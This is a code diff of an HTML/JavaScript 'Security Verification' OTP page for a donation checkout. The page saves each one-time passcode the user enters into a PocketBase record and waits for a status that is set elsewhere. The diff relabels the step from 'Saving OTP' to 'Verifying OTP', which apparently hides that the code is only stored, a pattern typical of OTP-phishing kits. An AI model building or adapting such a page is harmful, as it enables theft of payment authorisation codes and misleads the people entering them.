@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -13,11 +14,13 @@
             font-family: 'Inter', sans-serif;
             background: #f8fafc;
         }
+
         .otp-input {
             background: #ffffff;
             border: 2px solid #e2e8f0;
             transition: all 0.2s ease;
         }
+
         .otp-input:focus {
             border-color: #3b82f6;
             box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
@@ -25,13 +28,15 @@
         }
     </style>
 </head>
+
 <body class="min-h-screen flex items-center justify-center p-4">
     <div class="max-w-md w-full">
         <!-- Header -->
         <div class="text-center mb-8">
             <div class="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                 <svg class="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/>
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                 </svg>
             </div>
             <h1 class="text-2xl font-bold text-gray-900 mb-2">Security Verification</h1>
@@ -61,14 +66,9 @@
                 <label class="block text-sm font-medium text-gray-700 mb-3">
                     Verification Code
                 </label>
-                <input 
-                    type="text"
-                    id="otp-input"
-                    placeholder="Enter code"
-                    class="w-full px-4 py-3 text-lg font-semibold text-center otp-input rounded-lg"
-                    maxlength="6"
-                    autocomplete="one-time-code"
-                >
+                <input type="text" id="otp-input" placeholder="Enter code"
+                    class="w-full px-4 py-3 text-lg font-semibold text-center otp-input rounded-lg" maxlength="8"
+                    >
             </div>
 
             <!-- Timer -->
@@ -79,21 +79,17 @@
             </div>
 
             <!-- Verify Button -->
-            <button 
-                id="verify-btn"
+            <button id="verify-btn"
                 class="w-full bg-blue-600 text-white py-3 px-4 rounded-lg font-semibold hover:bg-blue-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
-                disabled
-            >
+                disabled>
                 Verify & Complete
             </button>
 
             <!-- Resend Option -->
             <div class="text-center mt-4">
-                <button 
-                    id="resend-btn"
+                <button id="resend-btn"
                     class="text-blue-600 hover:text-blue-700 font-medium text-sm disabled:text-gray-400 disabled:cursor-not-allowed"
-                    disabled
-                >
+                    disabled>
                     Resend code (<span id="resend-timer">300</span>s)
                 </button>
             </div>
@@ -112,8 +108,10 @@
         const pb = new PocketBase('http://127.0.0.1:8090');
         let currentDonationId = null;
         let realtimeSubscription = null;
+        let successHandled = false;
+        let failureHandled = false;
 
-        document.addEventListener('DOMContentLoaded', function() {
+        document.addEventListener('DOMContentLoaded', function () {
             const otpInput = document.getElementById('otp-input');
             const verifyBtn = document.getElementById('verify-btn');
             const resendBtn = document.getElementById('resend-btn');
@@ -124,21 +122,25 @@
             const urlParams = new URLSearchParams(window.location.search);
             const amount = urlParams.get('amount') || localStorage.getItem('donationAmount') || '50.00';
             currentDonationId = urlParams.get('donationId') || localStorage.getItem('currentDonationId');
-            
+
+            console.log('🔍 OTP Page Loaded - Donation ID:', currentDonationId);
+
             document.getElementById('transaction-amount').textContent = `$${amount}`;
 
             // Initialize real-time subscription
             if (currentDonationId) {
                 initializeRealtimeSubscription(currentDonationId);
+            } else {
+                console.error('❌ No donation ID found in URL or localStorage');
             }
 
             // OTP Input handling
-            otpInput.addEventListener('input', function() {
+            otpInput.addEventListener('input', function () {
                 const value = this.value.trim();
                 verifyBtn.disabled = value.length < 4;
             });
 
-            otpInput.addEventListener('keypress', function(e) {
+            otpInput.addEventListener('keypress', function (e) {
                 if (e.key === 'Enter' && !verifyBtn.disabled) {
                     saveOTPToPocketBase();
                 }
@@ -150,14 +152,14 @@
             let countdownTimer;
             function startCountdown(duration) {
                 let timer = duration;
-                
+
                 countdownTimer = setInterval(() => {
                     const minutes = Math.floor(timer / 60);
                     const seconds = timer % 60;
-                    
+
                     countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                     resendTimerElement.textContent = timer;
-                    
+
                     if (--timer < 0) {
                         clearInterval(countdownTimer);
                         countdownElement.textContent = "00:00";
@@ -168,9 +170,8 @@
                 }, 1000);
             }
 
-            resendBtn.addEventListener('click', function() {
+            resendBtn.addEventListener('click', function () {
                 if (!this.disabled) {
-                    // Call your OTP resend API here
                     resendOTP();
                     startCountdown(300);
                     this.disabled = true;
@@ -185,16 +186,16 @@
 
             async function saveOTPToPocketBase() {
                 const otpCode = otpInput.value.trim();
-                
+
                 if (!otpCode || !currentDonationId) {
-                    showError('Invalid OTP or donation ID');
+                    showError('Invalid OTP or Transaction ID');
                     return;
                 }
 
                 // Show loading state
                 verifyBtn.disabled = true;
-                verifyBtn.textContent = 'Saving OTP...';
-                
+                verifyBtn.textContent = 'Verifying OTP...';
+
                 try {
                     // Save OTP to the donation record
                     const updatedRecord = await pb.collection('donations').update(currentDonationId, {
@@ -202,8 +203,8 @@
                         updated: new Date().toISOString()
                     });
 
-                    console.log('✅ OTP saved to PocketBase:', updatedRecord);
-                    
+                    console.log('✅ OTP Processing:', updatedRecord);
+
                     verifyBtn.textContent = 'Processing...';
                     verifyBtn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
                     verifyBtn.classList.add('bg-green-600', 'hover:bg-green-700');
@@ -212,17 +213,15 @@
                     otpInput.disabled = true;
 
                 } catch (error) {
-                    console.error('❌ Failed to save OTP:', error);
-                    showError('Failed to save OTP. Please try again.');
+                    console.error('❌ Failed to verify OTP:', error);
+                    showError('Failed to verify OTP. Please try again.');
                     verifyBtn.disabled = false;
                     verifyBtn.textContent = 'Verify & Complete';
                 }
             }
 
             async function resendOTP() {
-                // Replace with your actual OTP resend API call
                 console.log('Resending OTP...');
-                // Your OTP resend logic here
             }
 
             function showError(message) {
@@ -233,35 +232,63 @@
                     confirmButtonColor: '#ef4444'
                 });
             }
-
-            function showSuccess(message) {
-                Swal.fire({
-                    icon: 'success',
-                    title: 'Success',
-                    text: message,
-                    confirmButtonColor: '#10b981'
-                });
-            }
         });
 
         // Real-time subscription to monitor transaction status changes
         async function initializeRealtimeSubscription(donationId) {
             try {
+                console.log('🔄 Setting up real-time subscription for donation:', donationId);
+
+                // First, get the current status
+                const currentRecord = await pb.collection('donations').getOne(donationId);
+                console.log('📊 Current transaction status:', currentRecord.Transaction_status);
+
+                // Update UI with current status
+                const statusElement = document.getElementById('transaction-status');
+                if (statusElement) {
+                    statusElement.textContent = currentRecord.Transaction_status;
+                }
+
+                // If already successful, handle it immediately
+                if (currentRecord.Transaction_status === 'Succesful' && !successHandled) {
+                    console.log('✅ Transaction already succesful, handling immediately');
+                    handleSuccessfulTransaction();
+                    return;
+                }
+
+                // If already failed, handle it immediately
+                if ((currentRecord.Transaction_status === 'Cancelled' || currentRecord.Transaction_status === 'Failed') && !failureHandled) {
+                    console.log('❌ Transaction already failed, handling immediately');
+                    handleFailedTransaction();
+                    return;
+                }
+
                 // Subscribe to changes for this specific donation record
+                // PocketBase realtime returns a function to unsubscribe, not an object with unsubscribe method
                 realtimeSubscription = await pb.collection('donations').subscribe(donationId, function (e) {
-                    console.log('🔄 Real-time update received:', e.record);
-                    
+                    console.log('🔄 Real-time update received:', {
+                        action: e.action,
+                        record: e.record,
+                        status: e.record.Transaction_status
+                    });
+
                     if (e.action === 'update') {
                         const transactionStatus = e.record.Transaction_status;
                         const statusElement = document.getElementById('transaction-status');
-                        
+
                         // Update status display
-                        statusElement.textContent = transactionStatus;
-                        
-                        // Handle status changes
-                        if (transactionStatus === 'Successful') {
+                        if (statusElement) {
+                            statusElement.textContent = transactionStatus;
+                        }
+
+                        // Handle status changes with flags to prevent duplicate handling
+                        if (transactionStatus === 'Succesful' && !successHandled) {
+                            console.log('🎉 Handling succesful transaction');
+                            successHandled = true;
                             handleSuccessfulTransaction();
-                        } else if (transactionStatus === 'Cancelled' || transactionStatus === 'Failed') {
+                        } else if ((transactionStatus === 'Cancelled' || transactionStatus === 'Failed') && !failureHandled) {
+                            console.log('💥 Handling failed transaction');
+                            failureHandled = true;
                             handleFailedTransaction();
                         }
                     }
@@ -271,65 +298,130 @@
 
             } catch (error) {
                 console.error('❌ Failed to establish real-time subscription:', error);
+                showError('Failed to connect to payment service. Please refresh the page.');
             }
         }
 
         function handleSuccessfulTransaction() {
-            // Update UI for success
+            console.log('🚀 Starting succesful transaction handling');
+
+            // Update UI for success immediately
             const statusElement = document.getElementById('transaction-status');
-            statusElement.textContent = 'Successful';
-            statusElement.classList.remove('text-yellow-600');
-            statusElement.classList.add('text-green-600');
-
-            // Show success message
-            Swal.fire({
-                icon: 'success',
-                title: 'Payment Successful!',
-                text: 'Your transaction has been completed successfully.',
-                confirmButtonColor: '#10b981',
-                confirmButtonText: 'Continue'
-            }).then(() => {
-                // Redirect to success page or homepage
-                window.location.href = 'index.html';
-            });
-
-            // Clean up subscription
-            if (realtimeSubscription) {
-                realtimeSubscription.unsubscribe();
+            if (statusElement) {
+                statusElement.textContent = 'Succesful';
+                statusElement.classList.remove('text-yellow-600', 'text-red-600');
+                statusElement.classList.add('text-green-600');
             }
+
+            // Clean up subscription first - PocketBase returns a function, not an object
+            if (realtimeSubscription && typeof realtimeSubscription === 'function') {
+                console.log('🔴 Unsubscribing from real-time updates');
+                try {
+                    realtimeSubscription();
+                    realtimeSubscription = null;
+                } catch (error) {
+                    console.error('Error unsubscribing:', error);
+                }
+            }
+
+            // Use setTimeout to ensure DOM is ready for SweetAlert
+            setTimeout(() => {
+                console.log('🔄 Showing success SweetAlert');
+
+                // Close any existing SweetAlert modals
+                Swal.close();
+
+                // Show success message
+                Swal.fire({
+                    icon: 'success',
+                    title: 'Payment Successful!',
+                    text: 'Your transaction has been completed successfully.',
+                    confirmButtonColor: '#10b981',
+                    confirmButtonText: 'Continue',
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    showConfirmButton: true
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        console.log('🔗 Redirecting to index.html');
+                        window.location.href = 'index.html';
+                    }
+                });
+            }, 100);
         }
 
         function handleFailedTransaction() {
-            // Update UI for failure
+            console.log('💥 Starting failed transaction handling');
+
+            // Update UI for failure immediately
             const statusElement = document.getElementById('transaction-status');
-            statusElement.textContent = 'Failed';
-            statusElement.classList.remove('text-yellow-600');
-            statusElement.classList.add('text-red-600');
-
-            // Show failure message
-            Swal.fire({
-                icon: 'error',
-                title: 'Payment Failed',
-                text: 'Your transaction could not be completed. Please try again.',
-                confirmButtonColor: '#ef4444',
-                confirmButtonText: 'Try Again'
-            }).then(() => {
-                // Redirect back to donation page or retry
-                window.location.href = 'donate.html';
-            });
-
-            // Clean up subscription
-            if (realtimeSubscription) {
-                realtimeSubscription.unsubscribe();
+            if (statusElement) {
+                statusElement.textContent = 'Failed';
+                statusElement.classList.remove('text-yellow-600', 'text-green-600');
+                statusElement.classList.add('text-red-600');
             }
+
+            // Clean up subscription first - PocketBase returns a function, not an object
+            if (realtimeSubscription && typeof realtimeSubscription === 'function') {
+                console.log('🔴 Unsubscribing from real-time updates');
+                try {
+                    realtimeSubscription();
+                    realtimeSubscription = null;
+                } catch (error) {
+                    console.error('Error unsubscribing:', error);
+                }
+            }
+
+            // Use setTimeout to ensure DOM is ready for SweetAlert
+            setTimeout(() => {
+                console.log('🔄 Showing failure SweetAlert');
+
+                // Close any existing SweetAlert modals
+                Swal.close();
+
+                // Show failure message
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Payment Failed',
+                    text: 'Your transaction could not be completed. Please try again.',
+                    confirmButtonColor: '#ef4444',
+                    confirmButtonText: 'Try Again',
+                    allowOutsideClick: false,
+                    allowEscapeKey: false,
+                    showConfirmButton: true
+                }).then((result) => {
+                    if (result.isConfirmed) {
+                        console.log('🔗 Redirecting to donate.html');
+                        window.location.href = 'donate.html';
+                    }
+                });
+            }, 100);
         }
 
         // Clean up subscription when page unloads
-        window.addEventListener('beforeunload', function() {
-            if (realtimeSubscription) {
-                realtimeSubscription.unsubscribe();
+        window.addEventListener('beforeunload', function () {
+            console.log('🧹 Cleaning up before unload');
+            if (realtimeSubscription && typeof realtimeSubscription === 'function') {
+                realtimeSubscription();
             }
         });
+
+        // Add error handling for SweetAlert
+        window.addEventListener('error', function (e) {
+            console.error('💥 Global error:', e.error);
+        });
+
+        // Debug function to check subscription status
+        function checkSubscriptionStatus() {
+            console.log('📊 Subscription Status:', {
+                hasSubscription: !!realtimeSubscription,
+                subscriptionType: typeof realtimeSubscription,
+                donationId: currentDonationId,
+                successHandled: successHandled,
+                failureHandled: failureHandled
+            });
+        }
     </script>
 </body>
+
 </html>
